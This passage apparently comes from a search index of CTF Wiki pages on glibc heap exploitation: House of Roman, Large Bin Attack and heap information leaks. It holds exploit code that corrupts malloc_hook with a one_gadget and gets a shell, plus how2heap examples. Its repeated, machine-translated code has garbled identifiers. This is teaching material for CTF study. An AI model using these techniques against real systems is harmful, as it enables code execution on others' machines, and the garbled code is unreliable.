0x5555557570a0: 0x0 0x0 0x5555557570b0: 0x0 0x0 0x5555557570c0: 0x0 0x0 0x5555557570d0: 0x0 0x0 0x5555557570e0: 0x0 0x0 0x5555557570f0: 0xd0 0x71 <---------- free 0x71 0x555555757100: 0x0 0x0 0x555555757110: 0x0 0x0 0x555555757120: 0x0 0x0 0x555555757130: 0x0 0x0 libc : 0x7ffff7a23d28 (\"malloc_hook\") At this time our FD is already near the malloc hook and is not ready for blasting.","title":"Step 1"},{"location":"pwn/linux/glibc-heap/house_of_roman/#step-2","text":"We only need to release the fix by releasing a chunk of size 0x71.","title":"Step 2"},{"location":"pwn/linux/glibc-heap/house_of_roman/#step-3","text":"Take advantage of unsortebin's attacking techniques and use the editing function to write onegadet.","title":"Step 3"},{"location":"pwn/linux/glibc-heap/house_of_roman/#exp-analysis","text":"Assign 3 chunk , set p64(0x61) at B + 0x78 , the function is fake size for the following fastbin attack create ( 0x18 , 0 ) # 0x20 create ( 0xc8 , 1 ) # d0 create ( 0x65 , 2 ) # 0x70 info ( \"create 2 chunk, 0x20, 0xd8\" ) fake = \"A\" * 0x68 fake += p64 ( 0x61 ) ## fake size edit ( 1 , fake ) info ( \"fake\" ) Release B and assign the same size again to B , where B+0x10 and B+0x18 have the address of main_arean . Assign 3 fastbin and off by one to modify B->size = 0x71 free(1) create(0xc8,1) create(0x65,3) # b create(0x65,15) create(0x65,18) over = \"A\"*0x18 # off by one over += \"\\x71\" # set chunk 1's size --> 0x71 edit(0,over) info(\"use off by one , chunk 1's size --> 0x71\") Generate two fastbin s, then use uaf to write some addresses and chain B to fastbin free ( 2 ) free ( 3 ) info ( \"Create two 0x70 fastbin\" ) heap_po = \" \\x20 \" edit ( 3 , heap_po ) info ( \"Link chunk'1 into fastbin\" ) Debug to see the status of fastbin at this time pwndbg> fastbins fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x555555757160 \u2014\u25b8 0x555555757020 \u2014\u25b8 0x7ffff7dd1b78 (main_arena+88) \u25c2\u2014 0x7ffff7dd1b78 0x80: 0x0 0x555555757020 is chunk B Then by modifying the low 2 bytes of B->fd , make B->fd= malloc_hook - 0x23 # malloc_hook above malloc_hook_nearly = \"\\xed\\x1a\" edit(1,malloc_hook_nearly) info(\"Partial write, modify fastbin->fd ---> malloc_hook\") Then allocate 3 `xk of 0x70 , and you can get the chunk where malloc_hook is located. create(0x65,0) create(0x65,0) create(0x65,0) Then free drop E , enter fastbin , use uaf to set E->fd = 0 , fix fastbin free(15) edit(15,p64(0x00)) info(\"Generate 0x71 fastbin again, modify fd =0, fix fastbin\") Then an unsorted bin attack, making the value of malloc_hook main_arena+88 create(0xc8,1) create(0xc8,1) create(0x18,2) create(0xc8,3) create(0xc8,4) free(1) po = \"B\" * 8 po + = \"\\x00\\x1b\" edit (1, po) create(0xc8,1) info(\"unsorted bin makes malloc_hook have the address of libc\") Make the malloc_hook address of one_gadget by modifying the lower three bytes of malloc_hook over = \"R\"*0x13 # padding for malloc_hook over + = \"\\xa4\\xd2\\xaf\" edit(0,over) info(\"malloc_hook to one_gadget\") Then free twice with the same chunk , trigger malloc_printerr , getshell free(18) free(18)","title":"Exp Analysis"},{"location":"pwn/linux/glibc-heap/house_of_roman/#link","text":"https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc https://github.com/romanking98/House-Of-Roman https://xz.aliyun.com/t/2316","title":"Link"},{"location":"pwn/linux/glibc-heap/introduction/","text":"\u5806\u5229\u7528 \u00b6 In this chapter, we will follow the steps below Introducing the macro operation of the heap we know well about dynamic memory allocation Describe the data structures used to achieve these operations Introduce the specific operations of using these data structures to achieve heap allocation and recycling Introduce the various utilization techniques of the heap from shallow to deep. For different applications, due to the different memory requirements, there are many implementations of the heap, as follows: dlmalloc \u2013 General purpose allocator ptmalloc2 \u2013 glibc jemalloc \u2013 FreeBSD and Firefox tcmalloc \u2013 Google libumem - Solaris Here we mainly introduce the implementation of the heap in glibc. If there is time later, it will continue to introduce the implementation of other heaps and their utilization. The main reference materials in this section are as follows. There are many contents in the text that will be consistent with the reference materials, and will not be explained in the future. black hat heap exploitation github heap exploition sploitfun glibc source code For more references, please see the files in the ref directory.","title":"Introduction to Heap"},{"location":"pwn/linux/glibc-heap/introduction/#_1","text":"In this chapter, we will follow the steps below Introducing the macro operation of the heap we know well about dynamic memory allocation Describe the data structures used to achieve these operations Introduce the specific operations of using these data structures to achieve heap allocation and recycling Introduce the various utilization techniques of the heap from shallow to deep. For different applications, due to the different memory requirements, there are many implementations of the heap, as follows: dlmalloc \u2013 General purpose allocator ptmalloc2 \u2013 glibc jemalloc \u2013 FreeBSD and Firefox tcmalloc \u2013 Google libumem - Solaris Here we mainly introduce the implementation of the heap in glibc. If there is time later, it will continue to introduce the implementation of other heaps and their utilization. The main reference materials in this section are as follows. There are many contents in the text that will be consistent with the reference materials, and will not be explained in the future. black hat heap exploitation github heap exploition sploitfun glibc source code For more references, please see the files in the ref directory.","title":"\u5806\u5229\u7528"},{"location":"pwn/linux/glibc-heap/large_bin_attack/","text":"Large Bin Attack \u00b6 Introduction \u00b6 Large Bin Attack can be used to modify the value of any address. For example, to modify global_max_fast and then do the next fast bin attack. while (( victim = unsorted_chunks ( off ) -& gt ; bk ) ! = unsorted_chunks ( off )) { bck = victim -> bk ; if ( __builtin_expect ( chunksize_nomask ( victim ) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( chunksize_nomask ( victim ) & gt ; off -& gt ; system_mem , 0 )) malloc_printerr ( check_action , \"malloc(): memory corruption\" , chunk2mem ( victim ), off ); size = chunksize ( victim ); /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ if ( in_smallbin_range ( nb ) && bck == unsorted_chunks ( off ) & amp ; & amp ; victim == off -& gt ; last_remainder & amp ; & amp ; ( unsigned long ) ( size ) > ( unsigned long ) ( nb + MINSIZE )) { /* split and reattach remainder */ remainder_size = size - nb ; remainder = chunk_at_offset ( victim , nb ); unsorted_chunks ( off ) -& gt ; bk = unsorted_chunks ( off ) -& gt ; fd = remainder ; av -& gt ; last_remainder = remainder ; remainder -> bk = remainder -> fd = unsorted_chunks ( av ); if ( ! in_smallbin_range ( remainder_size )) { remainder -> fd_nextsize = NULL ; remainder -> bk_nextsize = NULL ; } set_head ( victim , nb | PREV_INUSE | ( av ! = & amp ; main_arena ? NON_MAIN_ARENA : 0 )); set_head ( remainder , remainder_size | PREV_INUSE ); set_foot ( remainder , remainder_size ); check_malloced_chunk ( off , victim , nb ); void * p = chunk2mem ( victim ); alloc_perturb ( p , bytes ); return p ; } /* remove from unsorted list */ unsorted_chunks ( off ) -& gt ; bk = bck ; bck -& gt ; fd = unsorted_chunks ( off ); /* Take now instead of binning if exact fit */ if ( size == nb ) { set_inuse_bit_at_offset ( victim , size ); if ( by ! = & amp ; main_arena ) set_non_main_arena ( victim ); check_malloced_chunk ( off , victim , nb ); void * p = chunk2mem ( victim ); alloc_perturb ( p , bytes ); return p ; } /* place chunk in bin */ if ( in_smallbin_range ( size )) { victim_index = smallbin_index ( size ); bck = bin_at ( off , victim_index ); fwd = bck -> fd ; } else { victim_index = largebin_index ( size ); bck = bin_at ( off , victim_index ); fwd = bck -> fd ; /* maintain large bins in sorted order */ if ( fwd != bck ) { /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE ; /* if smaller than smallest, bypass loop below */ assert ( chunk_main_arena ( bck -> bk )); if (( unsigned long ) ( size ) < ( unsigned long ) chunksize_nomask ( bck -> bk )) { fwd = bck ; bck = bck -> bk ; victim -> fd_nextsize = fwd -> fd ; victim -> bk_nextsize = fwd -> fd -> bk_nextsize ; fwd -> fd -> bk_nextsize = victim -> bk_nextsize -> fd_nextsize = victim ; } else { assert ( chunk_main_arena ( fwd )); while (( unsigned long ) size < chunksize_nomask ( fwd )) { fwd = fwd -> fd_nextsize ; assert ( chunk_main_arena ( fwd )); } if (( unsigned long ) size == ( unsigned long ) chunksize_nomask ( fwd )) /* Always insert in the second position. */ fwd = fwd -> fd ; else { victim -> fd_nextsize = fwd ; victim -> bk_nextsize = fwd -> bk_nextsize ; fwd -> bk_nextsize = victim ; victim -> bk_nextsize -> fd_nextsize = victim ; } bck = fwd -> bk ; } } else victim -> fd_nextsize = victim -> bk_nextsize = victim ; } mark_bin ( off , victim_index ); victim -> bk = bck ; victim -> fd = fwd ; fwd -> bk = victim ; bck -> fd = victim ; #define MAX_ITERS 10000 if ( ++ iters & gt ; = MAX_ITERS ) break ; } The code associated with largebin is as above, the main core code we are using is the following branch: When the if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd)) condition is not satisfied if (( unsigned long ) size == ( unsigned long ) chunksize_nomask ( fwd )) /* Always insert in the second position. */ fwd = fwd -> fd ; else { victim -> fd_nextsize = fwd ; victim -> bk_nextsize = fwd -> bk_nextsize ; fwd -> bk_nextsize = victim ; victim -> bk_nextsize -> fd_nextsize = victim ; } example \u00b6 0x1 how2heap\uff1alarge_bin_attack \u00b6 We constructed the following scenario: PwnLife> parseheap addr prev size status fd bk 0x603000 0x0 0xa0 Used None None 0x6030a0 0x0 0x290 Freed 0x7ffff7dd1b58 0x6037a0 0x603330 0x290 0x30 Used None None 0x603360 0x0 0x410 Freed 0x7ffff7dd1f48 0x7ffff7dd1f48 0x603770 0x410 0x30 Used None None 0x6037a0 0x0 0x410 Freed 0x6030a0 0x7ffff7dd1b58 0x603bb0 0x410 0x30 Used None None The chunk scenario is as follows: top: 0x603be0 ( size : 0x20420 ) last_remainder: 0x6030a0 ( size : 0x290 ) unsortbin: 0x6037a0 ( size : 0x410 ) <--> 0x6030a0 ( size : 0x290 ) largebin [ 0 ] : 0x603360 ( size : 0x410 ) unsortbin : +----------------------------------------+ | | | | | +-------------+ | | | | v | P3 v | P1 | +-----+------+ | +------------+ | | | | | | | | | | | | | +------------+ | +------------+ | | | | | | | | size:0x410 | | | size:0x290 | | +------------+ | +------------+ | | | | | | + ----------- + fd | | | | +------------+ | +------------+ | | | | | | | +---------+ bk | +------------+ +------------+ Then we modify the chunk of P2 through some kind of vulnerability: p2 [ -1 ] = 0x3f1 ; p2 [ 0 ] = 0 ; p2 [ 2 ] = 0 ; p2 [ 1 ] = ( unsigned long )( & stack_var1 - 2 ); p2 [ 3 ] = ( unsigned long )( & stack_var2 - 4 ); Then we malloc a new chunk. At this time, because the fastbin is empty, the program traverses the unsorted bin. At that time, when the chunk in the unsorted bin is a large chunk, first determine whether the current chunk size is smaller than bck->bk . The size, which is the smallest chunk in the large bin, if it is, is added directly to the end. If not, it traverses the large bin until it finds that the size of a chunk is less than or equal to the current chunk size (the chunks of the large bin are aligned from large to small). Then insert the current chunk into the two linked lists of the large bin. The fd_nextsize in the large bin chunk points to the first chunk in the list that is smaller than itself, and bk_nextsize points to the first chunk larger than itself. At this time, we have only one chunk in the largebin, and the current chunk size is 0x290 is smaller than the chunk size in the largebin. First, the chunk in the unsorted bin is placed in the large bin, and then the large bin is traversed. At this time, the fwd chunk does not match the if. ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))` When this condition: [...] else { victim -> fd_nextsize = fwd ; victim -> bk_nextsize = fwd -> bk_nextsize ; fwd -> bk_nextsize = victim ; victim -> bk_nextsize -> fd_nextsize = victim ; } bck = fwd -> bk ; [...] mark_bin ( off , victim_index ); victim -> bk = bck ; victim -> fd = fwd ; fwd -> bk = victim ; bck -> fd = victim ; Fwd is now P2, victim is P3, and the two variables on the stack can be modified to victim . In detail: victim -> bk_nextsize = fwd -> bk_nextsize ; // then victim -> bk_nextsize -> fd_nextsize = victim ; Here fwd->bk_nextsize stores &stack_var2 - 4 , so the above statements equals to: ( & stack_var2 - 4 ) -> fd_nextsize = victim ; // equals to * ( & stack_var2 - 4 + 4 ) = victim ; , modifying stack_var2 . And then, we set bck = fwd->bk , and the following code will be executed: mark_bin ( off , victim_index ); victim -> bk = bck ; victim -> fd = fwd ; fwd -> bk = victim ; bck -> fd = victim ; Here we have: fwd -> bk = victim ; // equals to * ( & stack_var1 - 2 + 2 ) = victim Thus modifying stack_var1 .","title":"Large Bin Attack"},{"location":"pwn/linux/glibc-heap/large_bin_attack/#large-bin-attack","text":"","title":"Large Bin Attack"},{"location":"pwn/linux/glibc-heap/large_bin_attack/#introduction","text":"Large Bin Attack can be used to modify the value of any address. For example, to modify global_max_fast and then do the next fast bin attack. while (( victim = unsorted_chunks ( off ) -& gt ; bk ) ! = unsorted_chunks ( off )) { bck = victim -> bk ; if ( __builtin_expect ( chunksize_nomask ( victim ) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( chunksize_nomask ( victim ) & gt ; off -& gt ; system_mem , 0 )) malloc_printerr ( check_action , \"malloc(): memory corruption\" , chunk2mem ( victim ), off ); size = chunksize ( victim ); /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ if ( in_smallbin_range ( nb ) && bck == unsorted_chunks ( off ) & amp ; & amp ; victim == off -& gt ; last_remainder & amp ; & amp ; ( unsigned long ) ( size ) > ( unsigned long ) ( nb + MINSIZE )) { /* split and reattach remainder */ remainder_size = size - nb ; remainder = chunk_at_offset ( victim , nb ); unsorted_chunks ( off ) -& gt ; bk = unsorted_chunks ( off ) -& gt ; fd = remainder ; av -& gt ; last_remainder = remainder ; remainder -> bk = remainder -> fd = unsorted_chunks ( av ); if ( ! in_smallbin_range ( remainder_size )) { remainder -> fd_nextsize = NULL ; remainder -> bk_nextsize = NULL ; } set_head ( victim , nb | PREV_INUSE | ( av ! = & amp ; main_arena ? NON_MAIN_ARENA : 0 )); set_head ( remainder , remainder_size | PREV_INUSE ); set_foot ( remainder , remainder_size ); check_malloced_chunk ( off , victim , nb ); void * p = chunk2mem ( victim ); alloc_perturb ( p , bytes ); return p ; } /* remove from unsorted list */ unsorted_chunks ( off ) -& gt ; bk = bck ; bck -& gt ; fd = unsorted_chunks ( off ); /* Take now instead of binning if exact fit */ if ( size == nb ) { set_inuse_bit_at_offset ( victim , size ); if ( by ! = & amp ; main_arena ) set_non_main_arena ( victim ); check_malloced_chunk ( off , victim , nb ); void * p = chunk2mem ( victim ); alloc_perturb ( p , bytes ); return p ; } /* place chunk in bin */ if ( in_smallbin_range ( size )) { victim_index = smallbin_index ( size ); bck = bin_at ( off , victim_index ); fwd = bck -> fd ; } else { victim_index = largebin_index ( size ); bck = bin_at ( off , victim_index ); fwd = bck -> fd ; /* maintain large bins in sorted order */ if ( fwd != bck ) { /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE ; /* if smaller than smallest, bypass loop below */ assert ( chunk_main_arena ( bck -> bk )); if (( unsigned long ) ( size ) < ( unsigned long ) chunksize_nomask ( bck -> bk )) { fwd = bck ; bck = bck -> bk ; victim -> fd_nextsize = fwd -> fd ; victim -> bk_nextsize = fwd -> fd -> bk_nextsize ; fwd -> fd -> bk_nextsize = victim -> bk_nextsize -> fd_nextsize = victim ; } else { assert ( chunk_main_arena ( fwd )); while (( unsigned long ) size < chunksize_nomask ( fwd )) { fwd = fwd -> fd_nextsize ; assert ( chunk_main_arena ( fwd )); } if (( unsigned long ) size == ( unsigned long ) chunksize_nomask ( fwd )) /* Always insert in the second position. */ fwd = fwd -> fd ; else { victim -> fd_nextsize = fwd ; victim -> bk_nextsize = fwd -> bk_nextsize ; fwd -> bk_nextsize = victim ; victim -> bk_nextsize -> fd_nextsize = victim ; } bck = fwd -> bk ; } } else victim -> fd_nextsize = victim -> bk_nextsize = victim ; } mark_bin ( off , victim_index ); victim -> bk = bck ; victim -> fd = fwd ; fwd -> bk = victim ; bck -> fd = victim ; #define MAX_ITERS 10000 if ( ++ iters & gt ; = MAX_ITERS ) break ; } The code associated with largebin is as above, the main core code we are using is the following branch: When the if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd)) condition is not satisfied if (( unsigned long ) size == ( unsigned long ) chunksize_nomask ( fwd )) /* Always insert in the second position. */ fwd = fwd -> fd ; else { victim -> fd_nextsize = fwd ; victim -> bk_nextsize = fwd -> bk_nextsize ; fwd -> bk_nextsize = victim ; victim -> bk_nextsize -> fd_nextsize = victim ; }","title":"Introduction"},{"location":"pwn/linux/glibc-heap/large_bin_attack/#example","text":"","title":"example"},{"location":"pwn/linux/glibc-heap/large_bin_attack/#0x1-how2heaplarge_bin_attack","text":"We constructed the following scenario: PwnLife> parseheap addr prev size status fd bk 0x603000 0x0 0xa0 Used None None 0x6030a0 0x0 0x290 Freed 0x7ffff7dd1b58 0x6037a0 0x603330 0x290 0x30 Used None None 0x603360 0x0 0x410 Freed 0x7ffff7dd1f48 0x7ffff7dd1f48 0x603770 0x410 0x30 Used None None 0x6037a0 0x0 0x410 Freed 0x6030a0 0x7ffff7dd1b58 0x603bb0 0x410 0x30 Used None None The chunk scenario is as follows: top: 0x603be0 ( size : 0x20420 ) last_remainder: 0x6030a0 ( size : 0x290 ) unsortbin: 0x6037a0 ( size : 0x410 ) <--> 0x6030a0 ( size : 0x290 ) largebin [ 0 ] : 0x603360 ( size : 0x410 ) unsortbin : +----------------------------------------+ | | | | | +-------------+ | | | | v | P3 v | P1 | +-----+------+ | +------------+ | | | | | | | | | | | | | +------------+ | +------------+ | | | | | | | | size:0x410 | | | size:0x290 | | +------------+ | +------------+ | | | | | | + ----------- + fd | | | | +------------+ | +------------+ | | | | | | | +---------+ bk | +------------+ +------------+ Then we modify the chunk of P2 through some kind of vulnerability: p2 [ -1 ] = 0x3f1 ; p2 [ 0 ] = 0 ; p2 [ 2 ] = 0 ; p2 [ 1 ] = ( unsigned long )( & stack_var1 - 2 ); p2 [ 3 ] = ( unsigned long )( & stack_var2 - 4 ); Then we malloc a new chunk. At this time, because the fastbin is empty, the program traverses the unsorted bin. At that time, when the chunk in the unsorted bin is a large chunk, first determine whether the current chunk size is smaller than bck->bk . The size, which is the smallest chunk in the large bin, if it is, is added directly to the end. If not, it traverses the large bin until it finds that the size of a chunk is less than or equal to the current chunk size (the chunks of the large bin are aligned from large to small). Then insert the current chunk into the two linked lists of the large bin. The fd_nextsize in the large bin chunk points to the first chunk in the list that is smaller than itself, and bk_nextsize points to the first chunk larger than itself. At this time, we have only one chunk in the largebin, and the current chunk size is 0x290 is smaller than the chunk size in the largebin. First, the chunk in the unsorted bin is placed in the large bin, and then the large bin is traversed. At this time, the fwd chunk does not match the if. ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))` When this condition: [...] else { victim -> fd_nextsize = fwd ; victim -> bk_nextsize = fwd -> bk_nextsize ; fwd -> bk_nextsize = victim ; victim -> bk_nextsize -> fd_nextsize = victim ; } bck = fwd -> bk ; [...] mark_bin ( off , victim_index ); victim -> bk = bck ; victim -> fd = fwd ; fwd -> bk = victim ; bck -> fd = victim ; Fwd is now P2, victim is P3, and the two variables on the stack can be modified to victim . In detail: victim -> bk_nextsize = fwd -> bk_nextsize ; // then victim -> bk_nextsize -> fd_nextsize = victim ; Here fwd->bk_nextsize stores &stack_var2 - 4 , so the above statements equals to: ( & stack_var2 - 4 ) -> fd_nextsize = victim ; // equals to * ( & stack_var2 - 4 + 4 ) = victim ; , modifying stack_var2 . And then, we set bck = fwd->bk , and the following code will be executed: mark_bin ( off , victim_index ); victim -> bk = bck ; victim -> fd = fwd ; fwd -> bk = victim ; bck -> fd = victim ; Here we have: fwd -> bk = victim ; // equals to * ( & stack_var1 - 2 + 2 ) = victim Thus modifying stack_var1 .","title":"0x1 how2heap\uff1alarge_bin_attack"},{"location":"pwn/linux/glibc-heap/leak_heap/","text":"Information leakage through the heap \u00b6 What is information leakage? \u00b6 In the CTF, the Pwn topic is generally run on a remote server. Therefore, we can not know the address information such as libc.so address and Heap base address on the server, but these addresses are often needed when utilizing, and information leakage is required. Information leakage target \u00b6 What are the targets of information leakage? We can know this by observing the memory space. Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/pwn 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/pwn 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/pwn 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] 0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar] 0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso] 0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall] First, the first one is the base address of the main module, because the base address of the main module will change only when the PIE (address-independent code) is turned on. Therefore, the address of the main module does not need to be leaked normally. The second is the heap address. The heap address is changed for each process. For example, when you need to control the data in the heap, you may need to leak the base address first. The third is the address of libc.so. In many cases, we can only implement code execution through functions such as system in libc, and structures such as malloc_hook, one_gadgets, and IO_FILE are also stored in libc, so the address of libc is also leaked. The goal. By what to leak \u00b6 Through the previous knowledge, we know that the heap is divided into unsorted bin, fastbin, smallbin, large bin, etc. We examine these structures one by one to see how to leak. unsorted bin \u00b6 We construct two unsorted bins and look at its memory. Now there are two blocks in the unsorted bin list. The address of the first block is 0x602000 and the address of the second block is 0x6020f0. 0x602000: 0x0000000000000000 0x00000000000000d1 0x602010: 0x00007ffff7dd1b78 0x00000000006020f0 &lt;=== points to the next block 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x6020f0: 0x0000000000000000 0x00000000000000d1 0x602100: 0x0000000000602000 0x00007ffff7dd1b78 &lt;=== pointing to main_arena 0x602110: 0x0000000000000000 0x0000000000000000 0x602120: 0x0000000000000000 0x0000000000000000 So we know that through the unsorted bin we can get the address of a certain heap block and the address of main_areana. Once the address of a heap block is obtained, it can be calculated by the size of malloc to obtain the heap base address. Once the address of main_arena is obtained, since main_arena exists in libc.so, the offset can be calculated to get the base address of libc.so. Therefore, through the unsorted bin, you can get: 1. The base address of 1.libc.so 2. Heap base address fastbin \u00b6 We constructed two fastbins and looked at their memory. Now there are two blocks in the fastbin list. The address of the first block is 0x602040 and the address of the second block is 0x602000. 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000021 0x602050: 0x0000000000602000 0x0000000000000000 &lt;=== points to the first block According to the previous knowledge, we know that the block fd field at the end of the fastbin list is 0, after which the fd field of each block points to the previous block. Therefore, only the base address of the heap can be leaked by fastbin. smallbin \u00b6 We constructed two fastbins and looked at their memory. Now there are two blocks in the fastbin list. The address of the first block is 0x602000 and the address of the second block is 0x6020f0. 0x602000: 0x0000000000000000 0x00000000000000d1 0x602010: 0x00007ffff7dd1c38 0x00000000006020f0 &lt;=== Address of the next block 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x6020f0: 0x0000000000000000 0x00000000000000d1 0x602100: 0x0000000000602000 0x00007ffff7dd1c38 &lt;=== address of main_arena 0x602110: 0x0000000000000000 0x0000000000000000 0x602120: 0x0000000000000000 0x0000000000000000 Therefore, through the smallbin can get: 1.libc.so base address 2.heap base address Which vulnerabilities can be used for leaks \u00b6 Through the previous knowledge, we can know what address information exists in the heap, but to obtain these addresses, we need to implement the vulnerability. Generally speaking, the following vulnerabilities are available for information vulnerabilities. heap memory is not initialized Heap overflow Use-After-Free Cross-border reading heap extend ## 0x01 read UAF \u00b6 By, UAF, leaking heapbase: p0 = malloc ( 0x20 ); p1 = malloc ( 0x20 ); free ( p0 ); free ( p1 ); printf ( ' heap base : % p ' , * p1 ); Due to the nature of the fastbin list, when we construct a fastbin list ( 0x30 ) fastbin [ 1 ] : 0x602030 --> 0x602000 --> 0x0 There is a phenomenon of chunk 1 -> chunk 0. If the UAF vulnerability exists at this time, we can print the address of chunk 0 through show chunk 1. Similarly, leaking libc base p0 = malloc ( 0x100 ); free ( p0 ); printf ( \"libc: %p \\n \" , * p0 ); 0x02 overlapping chunks \u00b6 0x03 Partial Overwrite \u00b6 0x04 Relative Write \u00b6","title":"Information leakage through the heap"},{"location":"pwn/linux/glibc-heap/leak_heap/#information-leakage-through-the-heap","text":"","title":"Information leakage through the heap"},{"location":"pwn/linux/glibc-heap/leak_heap/#what-is-information-leakage","text":"In the CTF, the Pwn topic is generally run on a remote server. Therefore, we can not know the address information such as libc.so address and Heap base address on the server, but these addresses are often needed when utilizing, and information leakage is required.","title":"What is information leakage?"},{"location":"pwn/linux/glibc-heap/leak_heap/#information-leakage-target","text":"What are the targets of information leakage? We can know this by observing the memory space. Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/pwn 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/pwn 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/pwn 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] 0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar] 0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso] 0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall] First, the first one is the base address of the main module, because the base address of the main module will change only when the PIE (address-independent code) is turned on. Therefore, the address of the main module does not need to be leaked normally. The second is the heap address. The heap address is changed for each process. For example, when you need to control the data in the heap, you may need to leak the base address first. The third is the address of libc.so. In many cases, we can only implement code execution through functions such as system in libc, and structures such as malloc_hook, one_gadgets, and IO_FILE are also stored in libc, so the address of libc is also leaked. The goal.","title":"Information leakage target"},{"location":"pwn/linux/glibc-heap/leak_heap/#by-what-to-leak","text":"Through the previous knowledge, we know that the heap is divided into unsorted bin, fastbin, smallbin, large bin, etc. We examine these structures one by one to see how to leak.","title":"By what to leak"},{"location":"pwn/linux/glibc-heap/leak_heap/#unsorted-bin","text":"We construct two unsorted bins and look at its memory. Now there are two blocks in the unsorted bin list. The address of the first block is 0x602000 and the address of the second block is 0x6020f0. 0x602000: 0x0000000000000000 0x00000000000000d1 0x602010: 0x00007ffff7dd1b78 0x00000000006020f0 &lt;=== points to the next block 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x6020f0: 0x0000000000000000 0x00000000000000d1 0x602100: 0x0000000000602000 0x00007ffff7dd1b78 &lt;=== pointing to main_arena 0x602110: 0x0000000000000000 0x0000000000000000 0x602120: 0x0000000000000000 0x0000000000000000 So we know that through the unsorted bin we can get the address of a certain heap block and the address of main_areana. Once the address of a heap block is obtained, it can be calculated by the size of malloc to obtain the heap base address. Once the address of main_arena is obtained, since main_arena exists in libc.so, the offset can be calculated to get the base address of libc.so. Therefore, through the unsorted bin, you can get: 1. The base address of 1.libc.so 2. Heap base address","title":"unsorted bin"},{"location":"pwn/linux/glibc-heap/leak_heap/#fastbin","text":"We constructed two fastbins and looked at their memory. Now there are two blocks in the fastbin list. The address of the first block is 0x602040 and the address of the second block is 0x602000. 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000021 0x602050: 0x0000000000602000 0x0000000000000000 &lt;=== points to the first block According to the previous knowledge, we know that the block fd field 